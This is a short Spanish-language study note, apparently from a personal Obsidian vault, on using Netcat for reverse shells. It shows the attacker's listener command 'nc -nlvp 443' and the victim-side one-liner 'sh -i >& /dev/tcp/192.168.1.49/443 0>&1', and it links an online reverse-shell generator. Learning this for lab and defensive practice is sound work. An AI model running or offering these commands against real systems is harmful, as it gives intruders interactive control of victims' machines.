¿Que es Netcat?: Netcat es una herramienta de red que permite abrir puertos TCP/UDP en un HOST, asociar una shell a un puerto específico y forzar conexiones UDP/TCP. Es útil tanto para ataques como para auditores de seguridad de re  
  

> [!important] https://www.revshells.com - Este es un generador de shell inversa en línea que permite a cualquier persona configurar sus direcciones IP, puertos y shell de elección para sus payloads (cargas útiles) .

  

![[./imagenes/image.png]]

  

  
Ponemos el siguiente comando en nuestra maquina atacante **nc -nlvp 443** . Con esto ponemos el Netcat en escucha en el puerto 443.

  
  
`nc -nlvp 443`  
  

> [!important] `nc`: Invoca **la herramienta** Netcat.<br><br><br>`-n`: **Desactiva la resolución de nombres DNS**. Esto significa que solo se usarán direcciones IP sin intentar resolver nombres de dominio.<br><br><br>`-``l`: **Activa el modo de escucha** (listen), lo que **convierte Netcat en un servidor que espera conexiones entrantes**.<br><br><br>`-v`: Habilita el modo "verboso" (verbose), proporcionando **información** detallada **sobre las conexiones**.<br><br><br>`-``p 443`: Especifica el **puerto** en el **que** Netcat **estará escuchando**, en este caso, el puerto 443 (comúnmente utilizado por HTTPS).<br><br>

  

![[./imagenes/9d3054ff-5a86-428a-bcc8-294f30a5ddb7.png]]

  

Si conseguimos acceso a muestra maquina victima debemos inyectar el comando que habíamos conseguido con el reverse shell generator.  
  
  
`sh -i >& /dev/tcp/192.168.1.49/443 0>&1`

  

![[./imagenes/image 1.png]]

  

Nuestra maquina atacante Kali reacciona a la señal de la maquina victima, originado que tengamos abierta una terminal interactiva sobre la maquina victima.

  

![[./imagenes/image 2.png]]

![[./imagenes/image 3.png]]